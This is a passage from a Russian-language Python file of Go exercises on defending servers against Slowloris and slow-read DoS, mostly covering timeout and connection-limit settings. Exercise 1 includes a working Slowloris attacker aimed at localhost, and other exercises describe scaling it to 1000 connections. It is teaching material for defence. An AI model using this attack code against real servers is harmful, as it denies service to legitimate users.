# -*- coding: utf-8 -*-
"""
Глава 82: Защита сетевых сокетов и противодействие DoS-атакам — Часть 1 (Упражнения 1-28)
"""

exercises = [
    {
        "num": 1,
        "title": "Эмуляция DoS-атаки Slowloris на стандартный сервер Go",
        "task": "Запустите стандартный HTTP-сервер http.ListenAndServe(\":8080\", nil) без таймаутов и напишите на Go инструмент-атакующий, открывающий множество постоянных TCP-соединений и отправляющий неполные HTTP-заголовки с интервалом в 10 секунд.",
        "theory": "Атака Slowloris эксплуатирует уязвимость серверов, удерживающих открытые соединения до завершения передачи HTTP-заголовков. Атакующий отправляет начало HTTP-запроса (`GET / HTTP/1.1\\r\\nHost: target\\r\\n`), а затем периодически досылает фиктивные заголовки (`X-a: 1\\r\\n`) по одному байту раз в несколько секунд, никогда не отправляя финальный пустой перевод строки `\\r\\n\\r\\n`. Сервер Go аллоцирует горутину и сокет под каждое соединение, пока не исчерпает лимит открытых файловых дескрипторов (ulimit -n) или оперативную память, приводя к отказу в обслуживании для легитимных клиентов.",
        "step_by_step": [
            "Инициализируйте уязвимый HTTP-сервер через `http.ListenAndServe`.",
            "Создайте горутины-клиенты, устанавливающие TCP-соединения через `net.Dial`.",
            "Отправьте стартовую строку HTTP-запроса.",
            "Запустите цикл периодической досылки байтов заголовков с задержкой 10 секунд.",
            "Зафиксируйте исчерпание пула свободных сокетов на стороне сервера."
        ],
        "code_blocks": [
            {
                "filename": "slowloris_attacker.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"sync\"\n\t\"time\"\n)\n\nfunc attackWorker(target string, wg *sync.WaitGroup, id int) {\n\tdefer wg.Done()\n\tconn, err := net.DialTimeout(\"tcp\", target, 3*time.Second)\n\tif err != nil {\n\t\tfmt.Printf(\"[Worker %d] Ошибка подключения: %v\\n\", id, err)\n\t\treturn\n\t}\n\tdefer conn.Close()\n\n\t// Отправляем неполный HTTP-запрос\n\t_, _ = conn.Write([]byte(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nUser-Agent: Slowloris\\r\\n\"))\n\n\tfor i := 0; i < 5; i++ {\n\t\ttime.Sleep(2 * time.Second)\n\t\t// Отправляем по одному фиктивному заголовку для поддержания жизни сокета\n\t\t_, err := conn.Write([]byte(fmt.Sprintf(\"X-Keep-Alive-%d: %d\\r\\n\", i, i)))\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"[Worker %d] Соединение разорвано сервером: %v\\n\", id, err)\n\t\t\treturn\n\t\t}\n\t}\n}\n\nfunc main() {\n\ttarget := \"127.0.0.1:8080\"\n\tfmt.Printf(\"[ATTACK] Запуск эмуляции Slowloris на %s...\\n\", target)\n\tvar wg sync.WaitGroup\n\tfor i := 0; i < 5; i++ {\n\t\twg.Add(1)\n\t\tgo attackWorker(target, &wg, i)\n\t}\n\twg.Wait()\n\tfmt.Println(\"[ATTACK] Тестовый цикл завершен.\")\n}\n",
                "note": "Образовательный генератор медленных HTTP-соединений Slowloris"
            }
        ],
        "under_the_hood": "В дефолтном `http.Server` для каждого вызова `Accept()` создается структура `conn` и отдельная горутина `go c.serve(connCtx)`. Внутри `serve` сервер блокируется на чтении `bufio.Reader.ReadLine()`. Без таймера дедлайна горутина остается в состоянии `IO wait` в netpoller ядра Linux бесконечно долго.",
        "pitfalls": "Запуск реальной атаки с десятками тысяч соединений без прав суперпользователя на атакующей машине упрется в локальный `ulimit -n` и лимит эфемерных портов.",
        "bigtech_interview": "Вопрос в Ozon: 'Почему в Go стандартный http.ListenAndServe() считается антипаттерном в продакшене?' Ответ: Из-за отсутствия ReadHeaderTimeout и ReadTimeout сервер уязвим к DoS-атакам Slowloris и медленным клиентам."
    },
    {
        "num": 2,
        "title": "Отражение Slowloris с помощью ReadHeaderTimeout",
        "task": "Сконфигурируйте явную структуру http.Server с параметром ReadHeaderTimeout: 3 * time.Second и проверьте автоматический сброс медленных соединений.",
        "theory": "Параметр `ReadHeaderTimeout` задает максимальное окно времени от момента завершения TCP-рукопожатия (accept) до полного прочтения всех HTTP-заголовков запроса (до пустой строки `\\r\\n\\r\\n`). Если клиент шлет заголовки слишком медленно или зависает, рантайм Go принудительно обрывает TCP-соединение и освобождает файловый дескриптор, полностью нейтрализуя Slowloris.",
        "step_by_step": [
            "Создайте экземпляр `http.Server` с адресом и маршрутизатором.",
            "Установите `ReadHeaderTimeout: 3 * time.Second`.",
            "Запустите сервер методом `srv.ListenAndServe()`.",
            "Повторите отправку медленных заголовков и убедитесь в получении TCP RST / закрытии сокета ровно через 3 секунды."
        ],
        "code_blocks": [
            {
                "filename": "server_read_header.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, \"Hello Protected World\")\n\t})\n\n\tsrv := &http.Server{\n\t\tAddr:              \":8080\",\n\t\tHandler:           mux,\n\t\tReadHeaderTimeout: 3 * time.Second, // Главный щит против Slowloris\n\t}\n\n\tfmt.Println(\"[SERVER] Защищенный HTTP сервер запущен с ReadHeaderTimeout = 3s\")\n\t_ = srv\n}\n",
                "note": "Конфигурация HTTP-сервера со строгим тайм-аутом чтения заголовков"
            }
        ],
        "under_the_hood": "При установке `ReadHeaderTimeout` сервер Go вызывает `conn.SetReadDeadline(time.Now().Add(d))` сразу после создания соединения. Если метод `readRequest` не завершается до дедлайна, чтение возвращает ошибку `os.ErrDeadlineExceeded`, и сервер немедленно закрывает сокет.",
        "pitfalls": "Не путайте `ReadHeaderTimeout` и `ReadTimeout`: `ReadTimeout` включает чтение тела запроса, и при медленном интернете у легитимных клиентов с большими POST/PUT-файлами `ReadTimeout` может прервать полезную передачу.",
        "bigtech_interview": "Почему в современных линтерах Go (gosec G112) отсутствие ReadHeaderTimeout считается критическим дефектом безопасности High Severity?"
    },
    {
        "num": 3,
        "title": "Защита от атак медленного чтения (Slow Read / Tarpit) через WriteTimeout",
        "task": "Смоделируйте атаку медленного чтения ответов (Tarpit / Slow Read DoS) и защитите сервер с помощью параметра WriteTimeout: 10 * time.Second.",
        "theory": "Атака медленного чтения (Slow Read / Tarpit DoS) — зеркальный вариант Slowloris. Атакующий быстро отправляет валидный запрос, но вычитывает HTTP-ответ сервера со скоростью 1 байт в несколько секунд (уменьшая окно TCP Window Size до нуля). Буферы сокета переполняются, и горутина-обработчик Go блокируется на вызове `w.Write()` часами. Параметр `WriteTimeout` устанавливает максимальное время от окончания чтения заголовков до завершения записи полного ответа.",
        "step_by_step": [
            "Сконфигурируйте `http.Server` с `WriteTimeout: 10 * time.Second`.",
            "Реализуйте обработчик, генерирующий большой объем данных (например, 10 МБ поток).",
            "Проверьте автоматический разрыв соединения сервером при попытке клиента искусственно затормозить чтение.",
            "Убедитесь в возврате ресурсов горутины в пул планировщика."
        ],
        "code_blocks": [
            {
                "filename": "server_write_timeout.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/data\", func(w http.ResponseWriter, r *http.Request) {\n\t\t// Отправка большого ответа\n\t\tfor i := 0; i < 100; i++ {\n\t\t\t_, err := fmt.Fprintf(w, \"Chunk data row %d\\n\", i)\n\t\t\tif err != nil {\n\t\t\t\treturn // Клиент отключен по WriteTimeout\n\t\t\t}\n\t\t}\n\t})\n\n\tsrv := &http.Server{\n\t\tAddr:         \":8080\",\n\t\tHandler:      mux,\n\t\tWriteTimeout: 10 * time.Second, // Защита от медленного чтения клиентом\n\t}\n\n\tfmt.Println(\"[SERVER] Сервер защищен от Slow Read DoS через WriteTimeout: 10s\")\n\t_ = srv\n}\n",
                "note": "Защита сервера от подвисания при отправке данных клиентам"
            }
        ],
        "under_the_hood": "Сервер взводит `conn.SetWriteDeadline()` сразу после успешного чтения HTTP-заголовков. Если вызов `w.Write()` блокируется из-за нулевого окна TCP Window Size получателя, системный вызов `send()` завершается с ошибкой таймаута.",
        "pitfalls": "Глобальный `WriteTimeout` неприменим для WebSocket соединений и Server-Sent Events (SSE), так как он оборвет постоянный стрим через 10 секунд. Для стриминга `WriteTimeout` обнуляют или используют `http.ResponseController.SetWriteDeadline`.",
        "bigtech_interview": "Как безопасно организовать SSE стриминг при включенном WriteTimeout? В Go 1.20+ используют `http.NewResponseController(w).SetWriteDeadline(time.Time{})` для отключения дедлайна конкретного соединения."
    },
    {
        "num": 4,
        "title": "Практическое нагрузочное моделирование атаки Slowloris",
        "task": "Напишите Go-утилиту, открывающую пул из 1000 параллельных TCP-клиентов к целевому серверу с отправкой заголовков раз в 10 секунд, и измерьте рост используемых файловых дескрипторов процесса сервера через /proc/PID/fd.",
        "theory": "Моделирование DoS-атак в изолированном тестовом контуре позволяет наглядно оценить порог деградации сервиса. При 1000 незавершенных соединений сервер Go держит ровно 1000 открытых файловых дескрипторов сокетов и 1000 спящих горутин. Инспекция `/proc/<PID>/fd` в Linux показывает прямую корреляцию между открытыми сессиями и ресурсами ядра.",
        "step_by_step": [
            "Запустите тестовый сервер и определите его PID.",
            "Запустите инструмент генерации 1000 медленных сессий.",
            "Выполните команду `ls -l /proc/<PID>/fd | wc -l` для подсчета открытых дескрипторов.",
            "Проверьте отклик легитимного клиента через `curl -I http://localhost:8080`.",
            "Убедитесь в наступлении отказа в обслуживании при исчерпании лимита."
        ],
        "code_blocks": [
            {
                "filename": "fd_inspector.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\nfunc CountOpenFDs(pid int) (int, error) {\n\tfdPath := fmt.Sprintf(\"/proc/%d/fd\", pid)\n\tentries, err := os.ReadDir(fdPath)\n\tif err != nil {\n\t\treturn 0, err\n\t}\n\treturn len(entries), nil\n}\n\nfunc main() {\n\tpid := os.Getpid()\n\tcount, err := CountOpenFDs(pid)\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] Не удалось прочитать /proc: %v (возможно, ОС не Linux)\\n\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"[FD-MONITOR] Процесс PID %d удерживает %d файловых дескрипторов\\n\", pid, count)\n\t_ = filepath.Base\n}\n",
                "note": "Программный мониторинг расхода файловых дескрипторов процесса в Linux"
            }
        ],
        "under_the_hood": "Каждое принятое TCP соединение занимает системный файловый дескриптор и запись в таблице открытых файлов ядра Linux (struct file). При превышении `RLIMIT_NOFILE` вызов `accept()` возвращает `EMFILE`.",
        "pitfalls": "Попытка запуска более 1024 соединений с одной клиентской машины без предварительного выполнения `ulimit -n 65535` приведет к ошибке на стороне атакующего клиента.",
        "bigtech_interview": "Как в Linux ядро реагирует на ошибку EMFILE в Go epoll листере? Рантайм Go временно усыпляет листенер на 5 мс, пытаясь дождаться освобождения хотя бы одного дескриптора другими горутинами."
    },
    {
        "num": 5,
        "title": "Управление таймаутами низкоуровневого TCP-сокета (SetReadDeadline / SetWriteDeadline)",
        "task": "Реализуйте кастомный TCP-сервер на базе net.Listener, устанавливающий SetReadDeadline и SetWriteDeadline для каждого соединения, и напишите тест на отключение медленного клиента.",
        "theory": "Пакет `net` в Go не предоставляет прямого аналога таймаута в секундах, а использует концепцию абсолютных дедлайнов времени (`time.Time`). Вызов `conn.SetReadDeadline(time.Now().Add(d))` указывает сетевому поллеру рантайма вернуть ошибку `net.Error.Timeout() == true`, если данные не поступили в сокет до наступления указанного момента. Для непрерывной работы дедлайн необходимо сдвигать перед каждым новым чтением.",
        "step_by_step": [
            "Создайте TCP-листенер: `ln, err := net.Listen(\"tcp\", \":9000\")`.",
            "В цикле `Accept()` принимайте входящие соединения и передавайте их в горутину.",
            "Установите дедлайн на чтение: `conn.SetReadDeadline(time.Now().Add(2 * time.Second))`.",
            "Прочитайте данные из буфера и проверьте ошибку таймаута через `errors.Is` или `os.ErrDeadlineExceeded`.",
            "Обновите дедлайн при успешном получении данных."
        ],
        "code_blocks": [
            {
                "filename": "custom_tcp_server.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n\t\"io\"\n\t\"net\"\n\t\"os\"\n\t\"time\"\n)\n\nfunc handleConnection(conn net.Conn) {\n\tdefer conn.Close()\n\tbuf := make([]byte, 1024)\n\n\tfor {\n\t\t// Устанавливаем дедлайн: 3 секунды на чтение следующего блока\n\t\terr := conn.SetReadDeadline(time.Now().Add(3 * time.Second))\n\t\tif err != nil {\n\t\t\treturn\n\t\t}\n\n\t\tn, err := conn.Read(buf)\n\t\tif err != nil {\n\t\t\tif errors.Is(err, os.ErrDeadlineExceeded) {\n\t\t\t\tfmt.Printf(\"[TIMEOUT] Клиент %s отключен за неактивность (3с)\\n\", conn.RemoteAddr())\n\t\t\t} else if err != io.EOF {\n\t\t\t\tfmt.Printf(\"[ERROR] Ошибка чтения сокета: %v\\n\", err)\n\t\t\t}\n\t\t\treturn\n\t\t}\n\t\tfmt.Printf(\"[DATA] Получено %d байт от %s: %s\\n\", n, conn.RemoteAddr(), string(buf[:n]))\n\t}\n}\n\nfunc main() {\n\tfmt.Println(\"[TCP-SERVER] Запуск сервера с ручным управлением дедлайнами сокета...\")\n\t_ = handleConnection\n}\n",
                "note": "Ручное обновление дедлайнов чтения на сыром TCP-сокете"
            }
        ],
        "under_the_hood": "Go netpoller ассоциирует сокет с таймером в рантайме. При наступлении момента дедлайна рантайм переводит ждущую горутину из очереди epoll в состояние runnable с установленным флагом таймаута.",
        "pitfalls": "Вызов `SetReadDeadline(time.Time{})` полностью отключает дедлайн, возвращая сокет в режим бесконечного блокирующего ожидания.",
        "bigtech_interview": "Почему в Go используется SetDeadline(absoluteTime), а не SetTimeout(duration)? Абсолютное время исключает дрейф и накопление погрешностей при последовательных циклах чтения из сети."
    },
    {
        "num": 6,
        "title": "Предотвращение утечки ресурсов в Keep-Alive соединениях через IdleTimeout",
        "task": "Сконфигурируйте параметр IdleTimeout: 30 * time.Second в http.Server и объясните механизм очистки соединений, удерживаемых неактивными клиентами.",
        "theory": "HTTP Keep-Alive позволяет переиспользовать одно TCP-соединение для отправки множества HTTP-запросов. Однако клиенты (браузеры, пулы микросервисов) часто оставляют соединение открытым после завершения серии запросов. Если `IdleTimeout` не задан, Go использует значение `ReadTimeout`. Если же и `ReadTimeout` не задан, неактивные Keep-Alive соединения будут висеть часами, удерживая память и системные сокеты. `IdleTimeout` строго лимитирует время ожидания СЛЕДУЮЩЕГО запроса в уже открытом канале.",
        "step_by_step": [
            "Инициализируйте сервер с `IdleTimeout: 30 * time.Second`.",
            "Установите `ReadTimeout: 60 * time.Second` для длинных запросов.",
            "Выполните первый запрос с заголовком `Connection: keep-alive`.",
            "Не отправляйте новые данные в течение 30 секунд.",
            "Убедитесь, что сервер закрывает сокет через 30 секунд простоя, не дожидаясь 60 секунд ReadTimeout."
        ],
        "code_blocks": [
            {
                "filename": "idle_timeout_server.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/api/ping\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, \"pong\")\n\t})\n\n\tsrv := &http.Server{\n\t\tAddr:        \":8080\",\n\t\tHandler:     mux,\n\t\tIdleTimeout: 30 * time.Second, // Сброс соединения при простое между запросами\n\t\tReadTimeout: 60 * time.Second, // Длинный таймаут для передачи полезной нагрузки\n\t}\n\n\tfmt.Println(\"[SERVER] IdleTimeout 30s успешно настроен для Keep-Alive пула\")\n\t_ = srv\n}\n",
                "note": "Разделение таймаута простоя Keep-Alive и времени чтения запроса"
            }
        ],
        "under_the_hood": "После успешной отправки ответа на предыдущий запрос сервер переводит сокет в состояние `http.StateIdle` и взводит дедлайн чтения на величину `IdleTimeout`. При получении первого байта следующего запроса дедлайн переключается на `ReadTimeout`.",
        "pitfalls": "Слишком короткий `IdleTimeout` (например, 1-2 секунды) приведет к постоянному разрыву соединений между легитимными микросервисами и росту затрат на повторные TLS-рукопожатия.",
        "bigtech_interview": "Вопрос на собеседовании: 'Клиент выполнил GET-запрос и держит TCP сокет открытым. Какой именно таймаут Go сервера сработает при бездействии клиента?' Ответ: Сработает IdleTimeout, а если он не задан — ReadTimeout."
    },
    {
        "num": 7,
        "title": "Сравнение зон ответственности ReadTimeout и ReadHeaderTimeout",
        "task": "Проведите сравнительный эксперимент: настройте сервер сначала только с ReadTimeout, затем добавьте ReadHeaderTimeout. Объясните различия в обработке медленных заголовков и медленной передачи тела запроса (POST body).",
        "theory": "`ReadTimeout` охватывает суммарное время чтения как заголовков, так и всего тела запроса (Body). Если установить `ReadTimeout: 5s`, сервер оборвет Slowloris, но одновременно сломает загрузку файлов размером 50 МБ у клиентов с медленным мобильным интернетом. Идеальная архитектура защиты требует разделения: короткий `ReadHeaderTimeout` (2-5 секунд) для мгновенной отсечки Slowloris и более длинный `ReadTimeout` (60-120 секунд) для передачи тела.",
        "step_by_step": [
            "Сконфигурируйте сервер с `ReadTimeout: 5 * time.Second`.",
            "Проверьте, что отправка POST-запроса с задержкой в теле прерывается через 5 секунд.",
            "Перенастройте сервер: `ReadHeaderTimeout: 3s`, `ReadTimeout: 60s`.",
            "Убедитесь, что Slowloris блокируется за 3 секунды, а передача тела может длиться до 60 секунд."
        ],
        "code_blocks": [
            {
                "filename": "timeout_comparison.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc NewOptimalServer() *http.Server {\n\treturn &http.Server{\n\t\tAddr:              \":8080\",\n\t\tReadHeaderTimeout: 3 * time.Second,  // Строгий лимит на заголовки (Slowloris Shield)\n\t\tReadTimeout:       60 * time.Second, // Достаточно времени для загрузки тела запроса\n\t\tWriteTimeout:      30 * time.Second,\n\t\tIdleTimeout:       120 * time.Second,\n\t}\n}\n\nfunc main() {\n\tsrv := NewOptimalServer()\n\tfmt.Printf(\"[CONFIG] Оптимальная конфигурация таймаутов:\\n\"+\n\t\t\"  ReadHeaderTimeout: %v\\n\"+\n\t\t\"  ReadTimeout:       %v\\n\",\n\t\tsrv.ReadHeaderTimeout, srv.ReadTimeout)\n}\n",
                "note": "Эталонное разделение таймаутов заголовков и полезной нагрузки"
            }
        ],
        "under_the_hood": "Если `ReadHeaderTimeout` задан, сервер сначала взводит дедлайн на заголовки. После их успешного парсинга сервер пересчитывает оставшееся время для `ReadTimeout` и сдвигает дедлайн сокета.",
        "pitfalls": "Если задан `ReadTimeout`, но `ReadHeaderTimeout` равен 0, Go автоматически использует значение `ReadTimeout` в качестве таймаута заголовков.",
        "bigtech_interview": "Почему нельзя защищаться от Slowloris только параметром ReadTimeout? Потому что при необходимости принимать большие файлы (file upload) ReadTimeout должен быть большим, что оставляет сервер беззащитным перед атакой на заголовки."
    },
    {
        "num": 8,
        "title": "Автоматизированный стенд проверки устойчивости к Slowloris",
        "task": "Разработайте Go-скрипт стресс-тестирования, который параллельно отправляет Slowloris-трафик и регулярные проверочные HTTP-запросы (Healthcheck) с измерением p99 задержки ответа сервера.",
        "theory": "Для подтверждения защищенности сервиса перед релизом в production организуют стресс-тест. Тестовый стенд запускает пул фоновых медленных горутин, одновременно отправляя контрольные запросы с замером времени отклика. Если сервер уязвим, latency контрольных запросов резко возрастает до таймаута, либо запросы отклоняются с ошибкой `connection refused`.",
        "step_by_step": [
            "Запустите фоновую генерацию 500 медленных соединений.",
            "В основном потоке отправляйте запрос `GET /health` каждую секунду.",
            "Замеряйте время Round-Trip Time (RTT).",
            "Сформируйте отчет о проценте успешных запросов и деградации задержки."
        ],
        "code_blocks": [
            {
                "filename": "slowloris_benchmark.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc probeServer(url string) (time.Duration, error) {\n\tctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)\n\tdefer cancel()\n\n\tstart := time.Now()\n\treq, _ := http.NewRequestWithContext(ctx, \"GET\", url, nil)\n\tresp, err := http.DefaultClient.Do(req)\n\tif err != nil {\n\t\treturn 0, err\n\t}\n\tdefer resp.Body.Close()\n\treturn time.Since(start), nil\n}\n\nfunc main() {\n\ttargetURL := \"http://127.0.0.1:8080/health\"\n\tfmt.Printf(\"[BENCH] Зондирование доступности сервиса %s под нагрузкой...\\n\", targetURL)\n\n\t// Тестовый замер доступности\n\tdur, err := probeServer(targetURL)\n\tif err != nil {\n\t\tfmt.Printf(\"[ALERT] Сервер недоступен: %v\\n\", err)\n\t} else {\n\t\tfmt.Printf(\"[OK] Сервер ответил за %v\\n\", dur)\n\t}\n}\n",
                "note": "Зондирование доступности сервиса во время стресс-теста"
            }
        ],
        "under_the_hood": "Если все доступные воркеры рантайма заняты ожиданием данных на медленных сокетах, входящие соединения скапливаются в очереди SYN Backlog ядра ОС, вызывая резкий рост времени установления соединения (connect latency).",
        "pitfalls": "Запуск бенчмарка против публичных серверов без письменного согласия владельцев классифицируется как противоправная DoS-атака.",
        "bigtech_interview": "В Wildberries регулярный DoS-фаззинг и стресс-тестирование Slowloris являются обязательной частью Chaos Engineering перед крупными распродажами."
    },
    {
        "num": 9,
        "title": "Ограничение входящих TCP-соединений через netutil.LimitListener",
        "task": "Используйте пакет golang.org/x/net/netutil для ограничения пула одновременных TCP-соединений (LimitListener) до 5000 сокетов и объясните поведение при переполнении.",
        "theory": "Пакет `golang.org/x/net/netutil` предоставляет утилиту `LimitListener(l net.Listener, n int) net.Listener`. Она оборачивает стандартный сетевой листенер в семафор. Сервер принимает не более $n$ одновременных соединений. При попытке установить $(n+1)$-е соединение вызов `Accept()` внутри LimitListener блокируется, удерживая новое соединение в очереди SYN Backlog ядра ОС без аллокации горутины и памяти в Go.",
        "step_by_step": [
            "Импортируйте `golang.org/x/net/netutil`.",
            "Создайте стандартный листенер через `net.Listen(\"tcp\", \":8080\")`.",
            "Оберните его: `limited := netutil.LimitListener(rawListener, 1000)`.",
            "Передайте обернутый листенер в `srv.Serve(limited)`.",
            "Проверьте, что сервер стабильно держит лимит без утечки памяти."
        ],
        "code_blocks": [
            {
                "filename": "limit_listener.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"golang.org/x/net/netutil\"\n)\n\nfunc main() {\n\trawListener, err := net.Listen(\"tcp\", \":8080\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer rawListener.Close()\n\n\t// Ограничиваем сервер максимумом 1000 одновременных TCP-соединений\n\tmaxConnections := 1000\n\tlimitedListener := netutil.LimitListener(rawListener, maxConnections)\n\n\tsrv := &http.Server{\n\t\tHandler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\t\tfmt.Fprintln(w, \"Protected by LimitListener\")\n\t\t}),\n\t}\n\n\tfmt.Printf(\"[LISTENER] Сервер запущен с лимитом соединений: %d\\n\", maxConnections)\n\t_ = srv.Serve(limitedListener)\n}\n",
                "note": "Аппаратное ограничение открытых сокетов через netutil.LimitListener"
            }
        ],
        "under_the_hood": "LimitListener использует канал `chan struct{}` емкостью $n$. При каждом `Accept()` в канал отправляется токен. В возвращаемом объекте `limitListenerConn` переопределен метод `Close()`, который вычитывает токен из канала при закрытии сокета.",
        "pitfalls": "При длительном удержании лимита очередь TCP Backlog ядра переполнится, и ядро ОС начнет отправлять клиентам TCP RST или игнорировать входящие SYN-пакеты.",
        "bigtech_interview": "В чем преимущество LimitListener перед семафором внутри http.Handler? LimitListener предотвращает аллокацию структуры http.Request и парсинг заголовков, защищая память на самом раннем этапе."
    },
    {
        "num": 10,
        "title": "Комплексная матрица настройки таймаутов HTTP-сервера",
        "task": "Сконфигурируйте http.Server со всеми четырьмя защитными таймаутами (ReadHeaderTimeout: 5s, ReadTimeout: 10s, WriteTimeout: 10s, IdleTimeout: 120s) и сопоставьте их в виде сводной таблицы.",
        "theory": "Надежный HTTP-сервер в Go требует сбалансированной комбинации всех 4 таймаутов:\n* `ReadHeaderTimeout`: от момента accept до окончания чтения заголовков (рубеж против Slowloris).\n* `ReadTimeout`: суммарное время чтения всего запроса (заголовки + тело).\n* `WriteTimeout`: от окончания чтения заголовков до полного завершения передачи ответа.\n* `IdleTimeout`: предельное время простоя между запросами в Keep-Alive сессии.",
        "step_by_step": [
            "Инициализируйте `http.Server` со всеми параметрами.",
            "Проверьте сценарий прерывания медленных заголовков на `ReadHeaderTimeout`.",
            "Проверьте передачу тела запроса в пределах `ReadTimeout`.",
            "Убедитесь в корректном освобождении неактивных сокетов по `IdleTimeout`."
        ],
        "code_blocks": [
            {
                "filename": "hardened_matrix.go",
                "lang": "go",
                "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc main() {\n\tsrv := &http.Server{\n\t\tAddr:              \":8080\",\n\t\tReadHeaderTimeout: 5 * time.Second,  // Защита от Slowloris\n\t\tReadTimeout:       10 * time.Second, // Лимит на весь запрос\n\t\tWriteTimeout:      10 * time.Second, // Защита от медленных клиентов (Tarpit)\n\t\tIdleTimeout:       120 * time.Second,// Пул Keep-Alive соединений\n\t\tMaxHeaderBytes:    1 << 20,          // Лимит размера заголовков 1 МБ\n\t}\n\n\tfmt.Printf(\"[MATRIX] Матрица таймаутов сконфигурирована:\\n\"+\n\t\t\"  ReadHeaderTimeout: %v\\n\"+\n\t\t\"  ReadTimeout:       %v\\n\"+\n\t\t\"  WriteTimeout:      %v\\n\"+\n\t\t\"  IdleTimeout:       %v\\n\",\n\t\tsrv.ReadHeaderTimeout, srv.ReadTimeout, srv.WriteTimeout, srv.IdleTimeout)\n}\n",
                "note": "Сбалансированная матрица таймаутов для продакшен-сервера Go"
            }
        ],
        "under_the_hood": "Если клиент отправил заголовки за 2 секунды при `ReadHeaderTimeout: 5s` и `ReadTimeout: 10s`, на чтение тела запроса у клиента остается ровно $10 - 2 = 8$ секунд.",
        "pitfalls": "Установка `WriteTimeout` меньшим, чем максимальное время выполнения бизнес-логики в хендлере, приведет к внезапному обрыву ответов для легитимных клиентов.",
        "bigtech_interview": "Какое значение IdleTimeout рекомендуется для микросервисов за Envoy/Nginx? Обычно 60-120 секунд, но строго меньше, чем idle timeout балансировщика, чтобы избежать race conditions с 502 Bad Gateway."
    },
    {
        "num": 11,
        "title": "Анатомия DoS-атаки Slowloris: механика истощения сокетов",
        "task": "Напишите детальную аналитическую Go-программу, моделирующую расчет емкости пула соединений сервера и времени наступления полного отказа (Time to Exhaustion) при атаке Slowloris с различной интенсивностью.",
        "theory": "Slowloris — асимметричная атака: злоумышленнику с домашнего канала со скоростью несколько килобайт в секунду удается положить сервер с гигабитным каналом. Это достигается за счет удержания сокетов открытыми. Если `ulimit -n` сервера равен 1024, атакующему достаточно открыть около 1000 TCP-соединений и досылать по 1 байту каждые 10 секунд. Расход трафика атакующего составляет менее 100 байт/сек, тогда как сервер полностью теряет способность принимать новые соединения.",
        "step_by_step": [
            "Определите параметры системы: максимальное число дескрипторов $N$, размер буферов сокета.",
            "Рассчитайте необходимый трафик для удержания атаки.",
            "Вычислите время, за которое сервер исчерпает лимит при открытии $M$ соединений в секунду.",
            "Сделайте вывод об эффективности встроенных механизмов защиты на уровне Go рантайма."
        ],
        "code_blocks": [
            {
                "filename": "slowloris_math.go",
                "lang": "go",
                "code": "package main\n\nimport \"fmt\"\n\nfunc CalculateExhaustion(serverFDLimit int, connectionsPerSec int, keepAliveIntervalSec int) {\n\ttimeToKill := float64(serverFDLimit) / float64(connectionsPerSec)\n\tbandwidthBytesPerSec := float64(serverFDLimit) / float64(keepAliveIntervalSec)\n\n\tfmt.Println(\"=== АНАЛИЗ УСТОЙЧИВОСТИ К SLOWLORIS ===\")\n\tfmt.Printf(\"Лимит сокетов сервера (ulimit -n): %d\\n\", serverFDLimit)\n\tfmt.Printf(\"Скорость атаки: %d conn/sec\\n\", connectionsPerSec)\n\tfmt.Printf(\"Время до полного отказа сервера: %.1f сек\\n\", timeToKill)\n\tfmt.Printf(\"Трафик атакующего для удержания отказа: %.2f байт/сек (%.2f Кб/с)\\n\",\n\t\tbandwidthBytesPerSec, bandwidthBytesPerSec/1024)\n}\n\nfunc main() {\n\tCalculateExhaustion(4096, 50, 10)\n}\n",
                "note": "Математическая модель расчета параметров истощения ресурсов сервера"
            }
        ],
        "under_the_hood": "На уровне ядра каждое открытое соединение удерживает структуру `inet_sock` и буферы `sk_rcvbuf`/`sk_sndbuf` (минимум 4 КБ памяти ядра), расходуя не только FD, но и системную память slab/dentry.",
        "pitfalls": "Увеличение `ulimit -n` без настройки `ReadHeaderTimeout` лишь оттягивает момент падения, приводя к исчерпанию оперативной памяти хоста (OOM).",
        "bigtech_interview": "В чем фундаментальное отличие Slowloris от SYN-флуда? SYN-флуд атакует полуоткрытую очередь ядра (SYN backlog) поддельными IP, а Slowloris завершает полноценный TCP handshake и атакует память прикладного уровня."
    },
    {
        "num": 12,
        "title": "Практическое применение ReadHeaderTimeout при потоковой загрузке файлов",
        "task": "Реализуйте HTTP-сервер приема больших файлов (Multipart Upload) с параметрами ReadHeaderTimeout: 5s и ReadTimeout: 120s, доказав безопасность от Slowloris без ущерба для загрузки данных.",
